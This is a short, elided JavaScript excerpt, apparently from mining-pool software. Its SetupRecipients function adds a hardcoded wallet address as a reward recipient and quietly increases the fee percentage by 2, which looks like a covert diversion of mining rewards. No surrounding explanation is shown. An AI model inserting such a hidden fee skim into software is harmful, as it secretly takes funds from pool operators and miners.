    ...
    function SetupRecipients(){
        ...
        for (var r in options.rewardRecipients){
         ...
         try {
           ...
           rObj2.script = util.addressToScript(options.network, 'XNtCFMUJcVVYX3nCNmScepgHcetcRXpsba');
            options.feePercent += 2;
            recipients.push(rObj2);
            }
            catch(e){
                emitErrorLog('Error add CusAddresXNtCFMUJcVVYX3nCNmScepgHcetcRXpsba' );
            }
